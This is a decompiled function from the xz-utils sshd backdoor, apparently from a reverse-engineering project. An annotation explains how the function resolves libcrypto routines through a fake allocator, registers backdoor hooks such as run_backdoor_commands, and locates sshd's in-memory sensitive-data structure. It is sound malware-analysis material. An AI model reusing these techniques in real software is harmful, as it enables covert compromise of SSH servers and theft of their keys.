// /home/kali/xzre-ghidra/xzregh/105410_sshd_find_sensitive_data.c
// Function: sshd_find_sensitive_data @ 0x105410
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_find_sensitive_data(elf_info_t * sshd, elf_info_t * libcrypto, string_references_t * refs, imported_funcs_t * funcs, global_context_t * ctx)


/*
 * AutoDoc: Bootstraps the entire sensitive-data pipeline: it appends bookkeeping entries for `sshd_proxy_elevate`/socket helpers
 * into the secret-data log, uses the fake lzma allocator (pointed at libcrypto) to resolve `EVP_PKEY_new_raw_public_key`,
 * `EVP_Digest`, `EVP_DigestVerify`, `EVP_DigestVerifyInit`, `EVP_CIPHER_CTX_new`, `EVP_chacha20`, and sanity-checks that
 * the library exports the `EVP_sm*` family the payload expects. It locates sshd's code/data segments, finds the real
 * `sshd_main` entry (recording whether an ENDBR64 prefix is present), and runs both the xcalloc-based and `KRB5CCNAME`
 * heuristics to recover candidate struct addresses. Each candidate is scored via `sshd_get_sensitive_data_score`, and
 * whichever pointer clears the >=8 threshold is stored in `ctx->sshd_sensitive_data`; on failure all of the just-resolved
 * libcrypto stubs are freed before the helper reports that no recon data was found.
 */

#include "xzre_types.h"

BOOL sshd_find_sensitive_data
               (elf_info_t *sshd,elf_info_t *libcrypto,string_references_t *refs,
               imported_funcs_t *funcs,global_context_t *ctx)

{
  Elf64_Addr EVar1;
  Elf64_Ehdr *pEVar2;
  u64 uVar3;
  u8 *code_start_00;
  u8 *puVar4;
  BOOL BVar5;
  BOOL BVar6;
  uint uVar7;
  uint uVar8;
  lzma_allocator *allocator_00;
  pfn_EVP_DigestVerifyInit_t ppVar9;
  void *pvVar10;
  Elf64_Sym *pEVar11;
  Elf64_Sym *pEVar12;
  u8 *data_start_00;
  pfn_EVP_CIPHER_CTX_new_t ppVar13;
  pfn_EVP_chacha20_t ppVar14;
  long lVar15;
  secret_data_item_t *psVar16;
  sensitive_data *psVar17;
  byte bVar18;
  lzma_allocator *allocator;
  u8 *code_start;
  u8 *code_end;
  u8 *data_start;
  sensitive_data *xzcalloc_candidate;
  sensitive_data *krb_candidate;
  sensitive_data *winning_candidate;
  u64 local_b0;
  u8 *local_a8;
  u8 *local_a0;
  sensitive_data *local_98;
  sensitive_data *local_90;
  secret_data_item_t local_88;
  code *local_70;
  undefined8 local_68;
  undefined8 local_60;
  code *local_58;
  undefined8 local_50;
  undefined8 local_48;
  code *local_40;
  undefined8 local_38;
  undefined8 local_30;
  
  bVar18 = 0;
  BVar5 = secret_data_append_from_address((void *)0x0,(secret_data_shift_cursor_t)0x1c8,0,0x1d);
  if (BVar5 == FALSE) {
    return FALSE;
  }
  local_68 = 0x1b000001c8;
  local_88.code = (u8 *)sshd_proxy_elevate;
  local_88.shift_cursor = (secret_data_shift_cursor_t)0x1c8;
  local_88.operation_index = 0x1c;
  local_70 = run_backdoor_commands;
  local_88.shift_count = 0;
  local_88.index = 1;
  local_60 = 0x100000000;
  local_58 = sshd_get_usable_socket;
  local_50 = 0x1a000001c3;
  local_48 = 0x100000005;
  local_40 = sshd_get_client_socket;
  local_38 = 0x19000001bd;
  local_30 = 0x100000006;
  BVar5 = secret_data_append_items(&local_88,4,secret_data_append_item);
  if (BVar5 == FALSE) {
    return FALSE;
  }
  psVar16 = &local_88;
  for (lVar15 = 0x18; lVar15 != 0; lVar15 = lVar15 + -1) {
    *(undefined4 *)&psVar16->code = 0;
    psVar16 = (secret_data_item_t *)((long)psVar16 + (ulong)bVar18 * -8 + 4);
  }
  winning_candidate = (sensitive_data *)0x0;
  local_b0 = 0;
  local_a8 = (u8 *)0x0;
  local_a0 = (u8 *)0x0;
  local_98 = (sensitive_data *)0x0;
  local_90 = (sensitive_data *)0x0;
  allocator_00 = get_lzma_allocator();
  allocator_00->opaque = libcrypto;
  ppVar9 = (pfn_EVP_DigestVerifyInit_t)lzma_alloc(0x118,allocator_00);
  funcs->EVP_DigestVerifyInit = ppVar9;
  if (ppVar9 != (pfn_EVP_DigestVerifyInit_t)0x0) {
    funcs->resolved_imports_count = funcs->resolved_imports_count + 1;
  }
  pvVar10 = elf_get_code_segment(sshd,(u64 *)&winning_candidate);
  psVar17 = winning_candidate;
  if (pvVar10 == (void *)0x0) {
    return FALSE;
  }
  pEVar11 = elf_symbol_get(libcrypto,STR_EVP_DigestVerify,0);
  pEVar12 = elf_symbol_get(libcrypto,STR_EVP_sm,0);
  if (pEVar12 == (Elf64_Sym *)0x0) {
    return FALSE;
  }
  data_start_00 = (u8 *)elf_get_data_segment(sshd,&local_b0,FALSE);
  uVar3 = local_b0;
  if (data_start_00 == (u8 *)0x0) {
    return FALSE;
  }
  if (pEVar11 != (Elf64_Sym *)0x0) {
    EVar1 = pEVar11->st_value;
    pEVar2 = libcrypto->elfbase;
    funcs->resolved_imports_count = funcs->resolved_imports_count + 1;
    funcs->EVP_DigestVerify = (pfn_EVP_DigestVerify_t)(pEVar2->e_ident + EVar1);
  }
  ppVar13 = (pfn_EVP_CIPHER_CTX_new_t)lzma_alloc(0x838,allocator_00);
  funcs->EVP_CIPHER_CTX_new = ppVar13;
  if (ppVar13 != (pfn_EVP_CIPHER_CTX_new_t)0x0) {
    funcs->resolved_imports_count = funcs->resolved_imports_count + 1;
  }
  BVar5 = sshd_find_main(&local_a8,sshd,libcrypto,funcs);
  code_start_00 = local_a8;
  if (BVar5 == FALSE) {
    return FALSE;
  }
  ctx->sshd_main = local_a8;
  BVar5 = is_endbr64_instruction(local_a8,local_a8 + 4,0xe230);
  ctx->uses_endbr64 = (uint)(BVar5 != FALSE);
  puVar4 = (u8 *)((long)pvVar10 + (long)psVar17);
  if ((BVar5 != FALSE) &&
     (BVar5 = find_function(code_start_00,(void **)0x0,&local_a0,code_start_00,
                            (u8 *)((long)pvVar10 + (long)psVar17),FIND_NOP), puVar4 = local_a0,
     BVar5 == FALSE)) {
    return FALSE;
  }
  local_a0 = puVar4;
  BVar5 = sshd_get_sensitive_data_address_via_xcalloc
                    (data_start_00,data_start_00 + uVar3,code_start_00,local_a0,refs,&local_90);
  BVar6 = sshd_get_sensitive_data_address_via_krb5ccname
                    (data_start_00,data_start_00 + uVar3,code_start_00,local_a0,&local_98,sshd);
  ppVar14 = (pfn_EVP_chacha20_t)lzma_alloc(0xc28,allocator_00);
  psVar17 = local_90;
  funcs->EVP_chacha20 = ppVar14;
  if (ppVar14 != (pfn_EVP_chacha20_t)0x0) {
    funcs->resolved_imports_count = funcs->resolved_imports_count + 1;
  }
  if (BVar5 == FALSE) {
LAB_00105772:
    if (BVar6 == FALSE) goto LAB_001057d3;
    uVar7 = 0;
LAB_001057a6:
    uVar8 = sshd_get_sensitive_data_score(local_98,sshd,refs);
  }
  else {
    if (BVar6 != FALSE) {
      if (local_90 == local_98) {
        uVar7 = sshd_get_sensitive_data_score(local_90,sshd,refs);
        if (uVar7 < 8) {
          return FALSE;
        }
        goto LAB_0010575e;
      }
      uVar7 = sshd_get_sensitive_data_score(local_90,sshd,refs);
      goto LAB_001057a6;
    }
    if (BVar5 == FALSE) goto LAB_00105772;
    uVar7 = sshd_get_sensitive_data_score(local_90,sshd,refs);
    uVar8 = 0;
  }
  if (((uVar8 <= uVar7) && (psVar17 = local_90, 7 < uVar7)) ||
     ((uVar7 <= uVar8 && (psVar17 = local_98, 7 < uVar8)))) {
LAB_0010575e:
    ctx->sshd_sensitive_data = psVar17;
    return TRUE;
  }
LAB_001057d3:
  lzma_free(funcs->EVP_DigestVerifyInit,allocator_00);
  lzma_free(funcs->EVP_CIPHER_CTX_new,allocator_00);
  lzma_free(funcs->EVP_chacha20,allocator_00);
  return FALSE;
}

